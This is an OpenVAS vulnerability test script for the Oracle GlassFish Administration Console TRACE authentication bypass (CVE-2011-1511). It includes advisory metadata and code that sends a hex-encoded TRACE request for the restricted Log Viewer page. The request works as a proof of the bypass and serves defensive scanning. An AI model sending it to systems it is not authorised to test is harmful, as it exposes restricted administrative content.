###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_glassfish_sec_bypass_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Oracle Java GlassFish Server Security Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow local attackers to access sensitive data
  on the server without being authenticated, by making 'TRACE' requests against
  the Administration Console.
  Impact Level: System/Application";
tag_affected = "Oracle GlassFish version 3.0.1 and
  Sun GlassFish Enterprise Server 2.1.1";
tag_insight = "The flaw is due to an error in Administration Console, when handling
  HTTP requests using the 'TRACE' method. A remote unauthenticated attacker can
  get access to the content of restricted pages in the Administration Console.";
tag_solution = "Apply the security updates or Upgrade to Oracle GlassFish 3.1
  http://packetstormsecurity.org/files/view/101343/CORE-2010-1118.txt";
tag_summary = "The host is running Oracle GlassFish Server and is prone to
  security bypass vulnerability.";

if(description)
{
  script_id(801939);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_cve_id("CVE-2011-1511");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_name("Oracle Java GlassFish Server Security Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/May/296");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101343/CORE-2010-1118.txt");

  script_description(desc);
  script_summary("Check for security bypass vulnerability in Oracle Java GlassFish Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check for the default port
if(!port = get_http_port(default:4848)){
  port = 4848;
}

## Check port status
if(!get_port_state(port)){
  exit(0);
}

sndReq = http_get(item:"/", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:0);

## Confirm the server
if("Sun Java System Application Server" ><  rcvRes || "GlassFish Server" >< rcvRes)
{
  soc = open_sock_tcp(port);
  if(!soc){
    exit(0);
  }

  ## Get the host name
  host = get_host_name();
  
  ## Construct the attack request
  data = raw_string (0x54, 0x52, 0x41, 0x43, 0x45, 0x20, 0x2f, 0x63,
                     0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x6c, 0x6f,
                     0x67, 0x56, 0x69, 0x65, 0x77, 0x65, 0x72, 0x2f,
                     0x6c, 0x6f, 0x67, 0x56, 0x69, 0x65, 0x77, 0x65,
                     0x72, 0x2e, 0x6a, 0x73, 0x66, 0x20, 0x48, 0x54,
                     0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a,
                     0x48, 0x6f, 0x73, 0x74, 0x3a) + host +
                     raw_string(0x3a) + port + raw_string(0x0d, 0x0a,
                     0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x45,
                     0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a,
                     0x20, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x74,
                     0x79, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65,
                     0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63,
                     0x6c, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x0d, 0x0a);

  send(socket:soc, data:data);
  rcv = recv(socket:soc, length:1024);

  ## Check the Response
  if("<title>Log Viewer</title>" >< rcv && "405 TRACE method is not allowed" >!< rcv){
    security_hole(port);
  }
}
